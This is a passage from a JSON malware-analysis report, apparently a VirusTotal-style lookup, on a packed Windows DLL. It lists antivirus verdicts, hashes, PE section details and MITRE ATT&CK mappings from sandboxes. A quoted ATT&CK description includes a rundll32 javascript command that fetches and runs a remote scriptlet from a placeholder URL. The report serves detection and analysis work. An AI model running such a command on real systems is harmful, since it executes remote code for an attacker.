          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "BehavesLike.Win64.Trojan.wc"
        },
        "ALYac": {
          "method": "blacklist",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Gen:Variant.Lazy.435379"
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "engine_update": "20240103",
          "category": "malicious",
          "result": "unsafe"
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5041",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Trojan.Win32.Lazy.Vvx0"
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": "20231026",
          "category": "malicious",
          "result": "win/malicious_confidence_90% (W)"
        },
        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "undetected",
          "result": null
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.138.50866",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.138.50865",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Trojan.Lazy.D6A4B3"
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.627",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "ML.Attribute.HighConfidence"
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "malicious (high confidence)"
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "28638",
          "engine_update": "20240127",
          "category": "malicious",
          "result": "a variant of Generik.DSICZVP"
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.493",
          "engine_update": "20240125",
          "category": "malicious",
          "result": "Malicious"
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20240127",
          "category": "undetected",
          "result": null
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.29",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Malicious (score: 100)"
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20240127",
          "category": "malicious",
          "result": "Gen:Variant.Lazy.435379"
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Win64:Evo-gen [Trj]"
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20240127",
          "category": "malicious",
          "result": "Malware.Win32.Gencirc.13f9d8c7"
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-26.02",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Gen:Variant.Lazy.435379 (B)"
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Trojan.TR/Crypt.EPACK.Gen2"
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Gen:Variant.Lazy.435379"
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Trojan.Win32.POSSIBLETHREAT.USBLKO23"
        },
        "CMC": {
          "method": "blacklist",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "engine_update": "20240125",
          "category": "undetected",
          "result": null
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "engine_update": "20240127",
          "category": "malicious",
          "result": "Mal/Generic-S"
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "engine_update": "20231119",
          "category": "undetected",
          "result": null
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "engine_update": "20240127",
          "category": "undetected",
          "result": null
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": "1706311883",
          "engine_update": "20240127",
          "category": "malicious",
          "result": "Detected"
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "TR/Crypt.EPACK.Gen2"
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Trojan/Win32.Agent"
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "engine_update": "20230906",
          "category": "undetected",
          "result": null
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.156.174",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Ransom.Win64.Wacatac.ns"
        },
        "Xcitium": {
          "method": "blacklist",
          "engine_name": "Xcitium",
          "engine_version": "36381",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Trojan:Win32/Wacatac.A!ml"
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "A:25.37240B:27.34706",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Gen:Variant.Lazy.435379"
        },
        "Varist": {
          "method": "blacklist",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "W64/ABRisk.OWPE-7672"
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "engine_update": "20240127",
          "category": "undetected",
          "result": null
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "engine_update": "20230828",
          "category": "undetected",
          "result": null
        },
        "McAfee": {
          "method": "blacklist",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Artemis!5BE374A55E94"
        },
        "MAX": {
          "method": "blacklist",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "engine_update": "20240127",
          "category": "malicious",
          "result": "malware (ai score=83)"
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Malware.AI.3400379894"
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Trj/Chgt.AD"
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Trojan.Win32.POSSIBLETHREAT.USBLKO23"
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Trojan.Undefined!8.1327C (CLOUD)"
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20240126",
          "category": "undetected",
          "result": null
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Trojan.Crypt"
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20240125",
          "category": "malicious",
          "result": "Trojan.Malware.220673100.susgen"
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "W32/PossibleThreat"
        },
        "BitDefenderTheta": {
          "method": "blacklist",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "engine_update": "20240103",
          "category": "undetected",
          "result": null
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240126",
          "category": "malicious",
          "result": "Win64:Evo-gen [Trj]"
        },
        "DeepInstinct": {
          "method": "blacklist",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "engine_update": "20240122",
          "category": "malicious",
          "result": "MALICIOUS"
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "240126-00",
          "engine_update": "20240126",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20240103",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20240108",
          "category": "type-unsupported",
          "result": null
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20240127",
          "category": "type-unsupported",
          "result": null
        },
        "Cybereason": {
          "method": "blacklist",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "engine_update": "20231102",
          "category": "type-unsupported",
          "result": null
        }
      },
      "md5": "5be374a55e9452b98bf1375cc5507e96",
      "type_description": "Win32 DLL",
      "reputation": 0,
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 0,
          "medium": 1,
          "critical": 0,
          "low": 1
        }
      },
      "pe_info": {
        "timestamp": 1699528406,
        "imphash": "baa93d47220682c04d92f7797d9224ce",
        "machine_type": 34404,
        "entry_point": 9007104,
        "sections": [
          {
            "chi2": 10632.09,
            "virtual_address": 4096,
            "flags": "rwx",
            "raw_size": 47616,
            "entropy": 7.87,
            "virtual_size": 106496,
            "md5": "feee43f7add2dd1705d4831c8e9751d3"
          },
          {
            "name": ".rsrc",
            "chi2": -1,
            "virtual_address": 110592,
            "flags": "rw",
            "raw_size": 0,
            "entropy": 0,
            "virtual_size": 4096,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".idata",
            "chi2": 93007,
            "virtual_address": 114688,
            "flags": "rw",
            "raw_size": 512,
            "entropy": 1.3,
            "virtual_size": 4096,
            "md5": "fd214ebea53ffea7bbb18acbaa8874dc"
          },
          {
            "chi2": 124500,
            "virtual_address": 118784,
            "flags": "rwx",
            "raw_size": 512,
            "entropy": 0.23,
            "virtual_size": 5623808,
            "md5": "6b7d6fb5e5f7918a93ffa5ffa73dc387"
          },
          {
            "name": "thcuxqac",
            "chi2": 155658.62,
            "virtual_address": 5742592,
            "flags": "rwx",
            "raw_size": 3263488,
            "entropy": 7.97,
            "virtual_size": 3264512,
            "md5": "ba0966c3a3f9627779edfb61e88073e8"
          },
          {
            "name": "dlnlkxur",
            "chi2": 24220,
            "virtual_address": 9007104,
            "flags": "rwx",
            "raw_size": 512,
            "entropy": 4.85,
            "virtual_size": 4096,
            "md5": "8826e296d3d97f4778c482d1da354598"
          },
          {
            "name": ".pdataI",
            "chi2": 178370.73,
            "virtual_address": 9011200,
            "flags": "r",
            "raw_size": 3584,
            "entropy": 4.75,
            "virtual_size": 4096,
            "md5": "3243e2dfa610eaf9e8cb6c7a4daf4fbb"
          }
        ],
        "exports": [
          "SystemFunction001",
          "SystemFunction002",
          "SystemFunction003",
          "SystemFunction004",
          "SystemFunction005",
          "SystemFunction028",
          "SystemFunction029",
          "SystemFunction034",
          "SystemFunction036",
          "SystemFunction040",
          "SystemFunction041"
        ],
        "compiler_product_versions": [
          "[C++] VS2019 v16.9.2 build 29913 count=29",
          "[ C ] VS2019 v16.9.2 build 29913 count=14",
          "[ASM] VS2019 v16.9.2 build 29913 count=9",
          "[---] Unmarked objects count=91",
          "[LT+] VS2019 v16.9.4 build 29914 count=1",
          "[ASM] VS2019 v16.9.4 build 29914 count=1",
          "[EXP] VS2019 v16.9.4 build 29914 count=1",
          "[LNK] VS2019 v16.9.4 build 29914 count=1",
          "id: 0x104, version: 27412 count=11",
          "id: 0x103, version: 27412 count=5",
          "id: 0x105, version: 27412 count=135",
          "id: 0xfd, version: 28518 count=1",
          "id: 0x101, version: 27412 count=3"
        ],
        "rich_pe_header_hash": "018617679baee733a345d9543cdd97aa",
        "import_list": [
          {
            "library_name": "kernel32.dll",
            "imported_functions": [
              "lstrcpy"
            ]
          },
          {
            "library_name": "comctl32.dll",
            "imported_functions": [
              "InitCommonControls"
            ]
          }
        ]
      },
      "authentihash": "239b9996858af62f8c13b1e6ae881ffae620a44907c8d78332a65656937e9c85",
      "last_analysis_date": 1706312655,
      "last_analysis_stats": {
        "malicious": 42,
        "suspicious": 0,
        "undetected": 28,
        "harmless": 0,
        "timeout": 0,
        "confirmed-timeout": 0,
        "failure": 0,
        "type-unsupported": 5
      },
      "trid": [
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 45.5
        },
        {
          "file_type": "OS/2 Executable (generic)",
          "probability": 18.3
        },
        {
          "file_type": "Generic Win/DOS Executable",
          "probability": 18
        },
        {
          "file_type": "DOS Executable Generic",
          "probability": 18
        }
      ],
      "sha256": "4962a2f6cba601af509e3df0215b2eb581754cdf3410786a632b737873a399e2",
      "sha1": "9ee80c767a2e628056c7cf752fb0cf6aca301a6d",
      "magic": "PE32+ executable (DLL) (GUI) x86-64, for MS Windows",
      "unique_sources": 13,
      "type_tag": "pedll",
      "last_submission_date": 1706306326,
      "ssdeep": "49152:tEmuPCWXbT53j4zC0wyEwARtTGrucW2bvvKZO1Pz/zknSkOOst:QPCWRkH8tarucW2+mknypt"
    }
  },
  "mitre": {
    "data": {
      "CAPE Sandbox": {
        "tactics": [
          {
            "id": "TA0007",
            "name": "Discovery",
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "id": "T1082",
                "name": "System Information Discovery",
                "link": "https://attack.mitre.org/techniques/T1082/",
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture."
                  }
                ]
              },
              {
                "id": "T1010",
                "name": "Application Window Discovery",
                "link": "https://attack.mitre.org/techniques/T1010/",
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may attempt to get a listing of open application windows."
                  }
                ]
              },
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments."
                  }
                ]
              },
              {
                "id": "T1057",
                "name": "Process Discovery",
                "link": "https://attack.mitre.org/techniques/T1057/",
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may attempt to get information about running processes on a system."
                  }
                ]
              },
              {
                "id": "T1012",
                "name": "Query Registry",
                "link": "https://attack.mitre.org/techniques/T1012/",
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software."
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0005",
            "name": "Defense Evasion",
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments."
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0011",
            "name": "Command and Control",
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "id": "T1071",
                "name": "Application Layer Protocol",
                "link": "https://attack.mitre.org/techniques/T1071/",
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic."
                  }
                ]
              }
            ]
          }
        ]
      },
      "Zenbox": {
        "tactics": [
          {
            "id": "TA0005",
            "name": "Defense Evasion",
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Checks if the current process is being debugged"
                  },
                  {
                    "severity": "LOW",
                    "description": "Checks for debuggers (window names)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Contains capabilities to detect virtual machines"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries disk information (often used to detect virtual machines)"
                  }
                ]
              },
              {
                "id": "T1218.011",
                "name": "Rundll32",
                "link": "https://attack.mitre.org/techniques/T1218/011/",
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. \nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks. \nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Runs a DLL by calling functions"
                  }
                ]
              },
              {
                "id": "T1027.002",
                "name": "Software Packing",
                "link": "https://attack.mitre.org/techniques/T1027/002/",
                "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  }
                ]
              },
              {
                "id": "T1027",
                "name": "Obfuscated Files or Information",
                "link": "https://attack.mitre.org/techniques/T1027/",
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Binary may include packed or crypted data"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0007",
            "name": "Discovery",
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
